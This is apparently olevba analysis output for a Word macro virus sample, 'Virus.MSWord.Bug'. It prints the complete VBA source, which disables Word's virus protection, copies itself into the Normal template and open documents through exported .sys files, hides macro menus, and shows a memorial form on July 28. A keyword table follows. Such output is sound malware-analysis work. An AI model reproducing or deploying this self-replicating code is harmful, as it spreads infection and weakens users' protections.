olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Bug-899840cd4139b0402a024ad2972580c995dcf91b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Bug-899840cd4139b0402a024ad2972580c995dcf91b - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoClose()
'Tester2/23/01 11:12:58 AM00012144
T.UserForm_Click
'Tester2/23/01 11:12:58 AM00012144
If Day(Now) = 28 And Month(Now) = 7 Then T.Show
'Tester2/23/01 11:12:58 AM00012144
End Sub
'Tester2/23/01 11:12:58 AM00012144
Sub ViewVBCode()
'Tester2/23/01 11:12:58 AM00012144
End Sub
'Tester2/23/01 11:12:58 AM00012144
Sub ToolsMacro()
'Tester2/23/01 11:12:58 AM00012144
End Sub
-------------------------------------------------------------------------------
VBA MACRO T.frm 
in file: Virus.MSWord.Bug-899840cd4139b0402a024ad2972580c995dcf91b - OLE stream: 'Macros/VBA/T'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'Tester2/23/01 11:12:58 AM00012144
Sub UserForm_Click()
'Tester2/23/01 11:12:58 AM00012144
On Error GoTo out
'Tester2/23/01 11:12:58 AM00012144
Options.VirusProtection = False
'Tester2/23/01 11:12:58 AM00012144
Options.SaveNormalPrompt = False
'Tester2/23/01 11:12:58 AM00012144
Options.ConfirmConversions = False
'Tester2/23/01 11:12:58 AM00012144
ad = ActiveDocument.VBProject.VBComponents.Item(1).codemodule.countoflines
'Tester2/23/01 11:12:58 AM00012144
nt = NormalTemplate.VBProject.VBComponents.Item(1).codemodule.countoflines
'Tester2/23/01 11:12:58 AM00012144
If nt > 0 And ad > 0 Then GoTo out
'Tester2/23/01 11:12:58 AM00012144
If nt = 0 Then
'Tester2/23/01 11:12:58 AM00012144
    Set infect = NormalTemplate.VBProject.VBComponents
'Tester2/23/01 11:12:58 AM00012144
    Set host = ActiveDocument.VBProject.VBComponents
'Tester2/23/01 11:12:58 AM00012144
    host.Item(1).codemodule.replaceline 3, Application.UserInitials & ".UserForm_Click"
'Tester2/23/01 11:12:58 AM00012144
    host.Item(1).codemodule.replaceline 5, "If Day(Now) = 28 And Month(Now) = 7 Then " & Application.UserInitials & ".show"
'Tester2/23/01 11:12:58 AM00012144
    host.Item(1).Name = infect.Item(1).Name
'Tester2/23/01 11:12:58 AM00012144
    host.Item(2).Name = Application.UserInitials
'Tester2/23/01 11:12:58 AM00012144
    host.Item(1).Export "c:\one.sys"
'Tester2/23/01 11:12:58 AM00012144
    host.Item(2).Export "c:\two.sys"
'Tester2/23/01 11:12:58 AM00012144
End If
'Tester2/23/01 11:12:58 AM00012144
If ad = 0 Then Set infect = ActiveDocument.VBProject.VBComponents
'Tester2/23/01 11:12:58 AM00012144
infect.Import ("c:\two.sys")
'Tester2/23/01 11:12:58 AM00012144
infect.Item(1).codemodule.AddFromFile ("c:\one.sys")
'Tester2/23/01 11:12:58 AM00012144
With infect.Item(1).codemodule
'Tester2/23/01 11:12:58 AM00012144
    For x = 1 To 4
'Tester2/23/01 11:12:58 AM00012144
    .deletelines 1
'Tester2/23/01 11:12:58 AM00012144
    Next x
'Tester2/23/01 11:12:58 AM00012144
    If nt = 0 Then
'Tester2/23/01 11:12:58 AM00012144
    .insertlines 9, vbCr & "Sub ViewVBCode()"
'Tester2/23/01 11:12:58 AM00012144
    .insertlines 11, vbCr & "End Sub"
'Tester2/23/01 11:12:58 AM00012144
    .insertlines 13, vbCr & "Sub ToolsMacro()"
'Tester2/23/01 11:12:58 AM00012144
    .insertlines 15, vbCr & "End Sub"
'Tester2/23/01 11:12:58 AM00012144
    End If
'Tester2/23/01 11:12:58 AM00012144
End With
'Tester2/23/01 11:12:58 AM00012144
If nt = 0 Then infect.Item(1).codemodule.replaceline 1, "Sub AutoClose()"
'Tester2/23/01 11:12:58 AM00012144
If nt = 0 And ad = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
'Tester2/23/01 11:12:58 AM00012144
With infect.Item(2).codemodule
'Tester2/23/01 11:12:58 AM00012144
    .deletelines 1
'Tester2/23/01 11:12:58 AM00012144
    For x = 1 To infect.Item(2).codemodule.countoflines Step 2
'Tester2/23/01 11:12:58 AM00012144
    .replaceline x, "'" & Application.UserName & Now & Application.ActivePrinter & Application.ActiveWindow
'Tester2/23/01 11:12:58 AM00012144
    Next x
'Tester2/23/01 11:12:58 AM00012144
End With
'Tester2/23/01 11:12:58 AM00012144
With infect.Item(1).codemodule
'Tester2/23/01 11:12:58 AM00012144
    For x = 2 To infect.Item(1).codemodule.countoflines Step 2
'Tester2/23/01 11:12:58 AM00012144
    .replaceline x, "'" & Application.UserName & Now & Application.ActivePrinter & Application.ActiveWindow
'Tester2/23/01 11:12:58 AM00012144
    Next x
'Tester2/23/01 11:12:58 AM00012144
End With
'Tester2/23/01 11:12:58 AM00012144
out:
'Tester2/23/01 11:12:58 AM00012144
If nt <> 0 And ad = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
'Tester2/23/01 11:12:58 AM00012144
End Sub
'Tester2/23/01 11:12:58 AM00012144
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Bug-899840cd4139b0402a024ad2972580c995dcf91b' - OLE stream: 'Macros/T/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�WOOBIE@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Bug-899840cd4139b0402a024ad2972580c995dcf91b' - OLE stream: 'Macros/T/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Courier New
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Bug-899840cd4139b0402a024ad2972580c995dcf91b' - OLE stream: 'Macros/T/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�"Das Woo"�@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Bug-899840cd4139b0402a024ad2972580c995dcf91b' - OLE stream: 'Macros/T/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Courier New
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Bug-899840cd4139b0402a024ad2972580c995dcf91b' - OLE stream: 'Macros/T/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�-=-=-=-=-�@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Bug-899840cd4139b0402a024ad2972580c995dcf91b' - OLE stream: 'Macros/T/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Courier New
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Bug-899840cd4139b0402a024ad2972580c995dcf91b' - OLE stream: 'Macros/T/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�R.I.P. July 28, 1998�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Bug-899840cd4139b0402a024ad2972580c995dcf91b' - OLE stream: 'Macros/T/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Courier New
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Bug-899840cd4139b0402a024ad2972580c995dcf91b' - OLE stream: 'Macros/T/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�We Love YOu
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Bug-899840cd4139b0402a024ad2972580c995dcf91b' - OLE stream: 'Macros/T/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Courier New
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Bug-899840cd4139b0402a024ad2972580c995dcf91b' - OLE stream: 'Macros/T/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�-=-=-=-=-�@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Bug-899840cd4139b0402a024ad2972580c995dcf91b' - OLE stream: 'Macros/T/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Courier New
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Bug-899840cd4139b0402a024ad2972580c995dcf91b' - OLE stream: 'Macros/T/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�1992-1998�@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Bug-899840cd4139b0402a024ad2972580c995dcf91b' - OLE stream: 'Macros/T/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Courier New
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Bug-899840cd4139b0402a024ad2972580c995dcf91b' - OLE stream: 'Macros/T/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�You Will Be Missed, �
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Bug-899840cd4139b0402a024ad2972580c995dcf91b' - OLE stream: 'Macros/T/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Courier New
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label1'" IN 'Virus.MSWord.Bug-899840cd4139b0402a024ad2972580c995dcf91b' - OLE stream: 'Macros/T'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label2'" IN 'Virus.MSWord.Bug-899840cd4139b0402a024ad2972580c995dcf91b' - OLE stream: 'Macros/T'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label3'" IN 'Virus.MSWord.Bug-899840cd4139b0402a024ad2972580c995dcf91b' - OLE stream: 'Macros/T'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label4'" IN 'Virus.MSWord.Bug-899840cd4139b0402a024ad2972580c995dcf91b' - OLE stream: 'Macros/T'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label5'" IN 'Virus.MSWord.Bug-899840cd4139b0402a024ad2972580c995dcf91b' - OLE stream: 'Macros/T'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label6'" IN 'Virus.MSWord.Bug-899840cd4139b0402a024ad2972580c995dcf91b' - OLE stream: 'Macros/T'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label7'" IN 'Virus.MSWord.Bug-899840cd4139b0402a024ad2972580c995dcf91b' - OLE stream: 'Macros/T'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label8'" IN 'Virus.MSWord.Bug-899840cd4139b0402a024ad2972580c995dcf91b' - OLE stream: 'Macros/T'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label9'" IN 'Virus.MSWord.Bug-899840cd4139b0402a024ad2972580c995dcf91b' - OLE stream: 'Macros/T'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label10'" IN 'Virus.MSWord.Bug-899840cd4139b0402a024ad2972580c995dcf91b' - OLE stream: 'Macros/T'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label11'" IN 'Virus.MSWord.Bug-899840cd4139b0402a024ad2972580c995dcf91b' - OLE stream: 'Macros/T'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label12'" IN 'Virus.MSWord.Bug-899840cd4139b0402a024ad2972580c995dcf91b' - OLE stream: 'Macros/T'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label13'" IN 'Virus.MSWord.Bug-899840cd4139b0402a024ad2972580c995dcf91b' - OLE stream: 'Macros/T'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label14'" IN 'Virus.MSWord.Bug-899840cd4139b0402a024ad2972580c995dcf91b' - OLE stream: 'Macros/T'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label15'" IN 'Virus.MSWord.Bug-899840cd4139b0402a024ad2972580c995dcf91b' - OLE stream: 'Macros/T'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label16'" IN 'Virus.MSWord.Bug-899840cd4139b0402a024ad2972580c995dcf91b' - OLE stream: 'Macros/T'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label17'" IN 'Virus.MSWord.Bug-899840cd4139b0402a024ad2972580c995dcf91b' - OLE stream: 'Macros/T'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label18'" IN 'Virus.MSWord.Bug-899840cd4139b0402a024ad2972580c995dcf91b' - OLE stream: 'Macros/T'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label19'" IN 'Virus.MSWord.Bug-899840cd4139b0402a024ad2972580c995dcf91b' - OLE stream: 'Macros/T'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label20'" IN 'Virus.MSWord.Bug-899840cd4139b0402a024ad2972580c995dcf91b' - OLE stream: 'Macros/T'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label21'" IN 'Virus.MSWord.Bug-899840cd4139b0402a024ad2972580c995dcf91b' - OLE stream: 'Macros/T'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |UserForm_Click      |Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

